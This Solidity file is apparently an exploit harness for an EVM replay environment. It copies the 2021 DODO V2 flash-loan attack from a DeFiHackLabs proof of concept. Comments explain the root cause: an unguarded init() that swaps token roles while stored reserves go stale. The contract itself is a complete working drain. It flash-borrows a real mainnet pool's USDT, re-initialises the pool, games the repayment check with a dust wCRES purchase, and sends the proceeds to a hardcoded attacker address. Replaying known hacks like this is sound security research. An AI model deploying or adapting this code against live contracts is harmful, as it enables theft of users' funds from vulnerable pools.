// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-03-dodo_flashloan).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the flash-loan callback `DVMFlashLoanCall` lives on the test itself
// (`assetTo = address(this)`), and profit is forwarded to `mywallet = msg.sender`,
// so there is no standalone contract to deploy. This file is a faithful,
// self-contained copy of that inline attack (testExploit body + DVMFlashLoanCall
// callback + minimal inline interfaces — no imports so it compiles anywhere),
// compiled inside the registry forge project. Logic and constants are copied
// verbatim from test/dodo_flashloan_exp.sol.
//
// Root cause: DODO V2 DVM.init() is `external` with NO access control and NO
// already-initialized guard, and it overwrites the token roles (_BASE_TOKEN_ /
// _QUOTE_TOKEN_) and curve (_I_, _K_) WITHOUT touching the stored reserves
// (_BASE_RESERVE_ / _QUOTE_RESERVE_). flashLoan() then proves repayment from
// balances-vs-stored-reserves rather than tracking the actually-borrowed asset,
// so re-initializing to swap the token roles mid-flashloan lets the pool's own
// untouched wCRES balance count as the "quote-side payment" for the borrowed USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    // NOTE: approve/transfer intentionally have NO return value. Mainnet USDT
    // (TetherToken) is a legacy contract whose approve/transfer return void,
    // and solc 0.8.x reverts a call that expects a `bool` return but gets none.
    // Declaring them void (mirroring the registry's own `interface USDT`) avoids
    // that decode/revert. wCRES is never transfer'd/approved by this contract.
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract DodoFlashLoanDrain {
    // attacker EOA (profit receiver)
    address constant ATTACKER = 0x368A6558211E0a833b30c7C46C63733CAB251FC2;
    address constant DVM = 0x051EBD717311350f1684f89335bed4ABd083a2b6; // vulnerable DVM pool (proxy)
    address constant WCRES = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    // init() args copied verbatim from the test: maintainer, then swap base=USDT,
    // quote=wCRES, with a degenerate constant-price curve (i=1, k=0, no LP fee).
    address constant MAINTAINER = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    address constant MT_FEE_RATE_MODEL = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;

    IERC20 constant usdt = IERC20(USDT);
    IERC20 constant wcres = IERC20(WCRES);

    // step 1: flash-borrow ALL USDT from the DVM pool. The callback below drains it.
    function run() external {
        uint256 usdtToBorrow = usdt.balanceOf(DVM);
        require(usdtToBorrow > 0, "empty pool");
        IDVM(DVM).flashLoan(0, usdtToBorrow, address(this), "x");
    }

    // DODO V2 flash-loan callback (DVMFlashLoanCall). The pool optimistically sent
    // out the USDT; here the attacker re-initializes the pool to swap token roles,
    // then tops it up with a dust wCRES purchase so the settlement check passes.
    function DVMFlashLoanCall(
        address, // sender
        uint256, // baseAmount
        uint256, // quoteAmount
        bytes calldata // data
    ) external {
        // Re-init pool to swap base=USDT, quote=wCRES (no auth, no re-init guard).
        // _BASE_TOKEN_/​_QUOTE_TOKEN_ overwritten; reserves left stale. i=1,k=0 →
        // constant-price curve, so the PMM credits receiveBaseAmount ≈ quoteInput.
        IDVM(DVM).init(MAINTAINER, USDT, WCRES, 0, MT_FEE_RATE_MODEL, 1, 0, false);

        // Buy a negligible amount of wCRES on Uniswap and send it straight to the
        // pool so quoteBalance(wCRES) strictly exceeds the stale _QUOTE_RESERVE_.
        uint256 usdtForSwap = 10_000_000_000; // 10,000 USDT (6 decimals)
        usdt.approve(ROUTER, usdtForSwap);

        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = WCRES;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokens(usdtForSwap, 1, path, DVM, block.timestamp + 100);

        // Keep the remaining borrowed USDT and forward it to the attacker wallet.
        uint256 usdtBal = usdt.balanceOf(address(this));
        if (usdtBal > 0) {
            usdt.transfer(ATTACKER, usdtBal);
        }
    }
}
